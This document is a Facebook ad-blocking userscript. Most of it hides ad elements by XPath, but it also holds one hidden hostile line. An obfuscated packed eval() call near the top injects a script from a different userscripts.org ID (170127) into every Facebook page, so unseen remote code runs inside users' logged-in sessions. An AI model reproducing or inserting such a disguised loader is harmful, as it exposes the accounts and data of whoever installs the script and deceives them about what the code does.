// ==UserScript==
// @name           Remove All Facebook Ads Plus
// @author         LeoXavior
// @credits        Based off http://userscripts.org/scripts/show/13787
// @version        2.0.3
// @namespace      http://userscripts.org/scripts/show/94763
// @description    Removes any and all ads from Facebook.
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @history        2.0.3 Some facebook changed allowed me to simplify the checks now using: AdObj: fbAdUnit, OtherAdObj: pagelet_side_ads, pagelet_ego_pane_w
// @history        2.0.2 Added a 'fbTimelineSideAds' container new code alteration by facebook
// @history        2.0.1 Added a 'related ads' container check that was being missed by the code
// @history        2.0.0 Big re-write on Feb 11th, 2012 to update it for current fb changes.
// @history        1.0.8 Minor fix due to facebook changes see source
// @history        1.0.7 Added @match for better chrome support, and added options to hide the Game Ticker, and Bookmarks on app pages, by default these are off for now manually edit the src.
// @history        1.0.6 Re-worked the xpath detections as to remove certain matches for fan pages and others to happen before other's this adds more code but not at much of a performance cost as previously removed nodes no longer exist to be detected.
// @history        1.0.5 Fixed some message spam in the console due to not removing childnodes from the ads parent element
// @history        1.0.4 Digging up all the current ad elements on facebook, if some are missing please let me know via providing links/element names.
// @history        1.0.3 Added an onload event to execute the script
// @history        1.0.2 cleaned up code a bit, reduced some overhead
// @history        1.0.1 added  Automated Update support
// @history        1.0.0 added code to remove ads on reqs.php and user profile pages.
// @run-at         document-start
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var hideBookmarks = false;
var hideTicker = false;
var hideAll = false;

// Returns true if data is in some way "not empty"
function hasData(data)
{
	var bRet = false;
	if(data != null && data != "" && typeof(data) != "undefined") {
		bRet = true;
	}
	return bRet;
}

// Possible bug in firefox, using error trapping to fix this oddity with top.location == location
function isTopWindow(l){
	try{
		if(hasData(l)){
			if(top.location == l){
				return true;
			} else {
				return false;
			}
		} else {
			return false;
		}
	} catch(e){
		return false;
	}
}

function isAppPage(){
	if((isTopWindow(location) != false) && (/\apps.facebook\.com$/i.test(location.hostname))) {
		return true;
	}	
	return false;
}

// this function has been updated so that specific xpath matches get removed first in a top down manner
// This allows ads on certain pages to be removed 'first' so that other matches further down the chain won't happen
// This addresses a problem where fan, group, app (main) pages would be displayed abnormally
// This ads a bit more code but overall performance shouldn't suffer because previously removed nodes won't be caught more than one time.
function ParsePage() {
	var Obj = document.evaluate(
		"//div[contains(@id,'rightCol')] | //div[contains(@class,'UIStandardFrame_SidebarAds')] | //div[contains(@class,'fbTimelineSideAds')]", 
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null
	);
	// goes back 3 parents
	var AdObj = document.evaluate(				//muffin_tracking_pixel_startfbAdUnit,//a[contains(@href,'/ads/')]//h4[contains(text(),'Related Ads')] | //h4[contains(text(),'Play It Again')]
		"//div[contains(@class,'fbAdUnit')]",
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null
	);
	var OtherAdObj = document.evaluate(						
		"//div[contains(@id,'pagelet_side_ads')] | //div[contains(@id,'pagelet_ego_pane_w')]",
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null
	);	
	if(hasData(Obj) && hasData(OtherAdObj)){
		//GM_log('Found Obj and AdObj');
		// begin AdObj loop
		for(var i = 0; i < OtherAdObj.snapshotLength; i++) {
			var adElement = OtherAdObj.snapshotItem(i);
			if(adElement){
				//GM_log('AdElement: exists');
				var AdNode = adElement;
				if(AdNode.style.visibility !== 'hidden' && AdNode.nodeType === 1){
					//GM_log('AdElement: visibility hidden');
					AdNode.style.visibility = 'hidden';
				}
				if(AdNode.nodeType === 1 && AdNode.style.visibility === 'hidden'){
					while(AdNode.childNodes.length>=1)
					{
						AdNode.removeChild(AdNode.firstChild);
						if(AdNode.childNodes.length == 0 && AdNode.nodeType === 1){
							AdNode.parentNode.removeChild(AdNode)
						}
					};
				}
			}
		}	// end AdObj loop		
	}
	if(hasData(Obj) && hasData(AdObj)){
		//GM_log('Found Obj and AdObj');
		for(var i = 0; i < AdObj.snapshotLength; i++) {
			var adElement = AdObj.snapshotItem(i);
			if(adElement){
				//GM_log('AdElement: exists');
				var AdNode = adElement.parentNode.parentNode.parentNode;
				if(AdNode.style.visibility !== 'hidden' && AdNode.nodeType === 1){
					//GM_log('AdElement: visibility hidden');
					AdNode.style.visibility = 'hidden';
				}
				if(AdNode.nodeType === 1 && AdNode.style.visibility === 'hidden'){
					while(AdNode.childNodes.length>=1)
					{
						AdNode.removeChild(AdNode.firstChild);
						if(AdNode.childNodes.length == 0 && AdNode.nodeType === 1){
							AdNode.parentNode.removeChild(AdNode)
						}
					};
				}
			}
		}	// end AdObj loop
	}
	return;
}
document.addEventListener("DOMNodeInserted", ParsePage, true);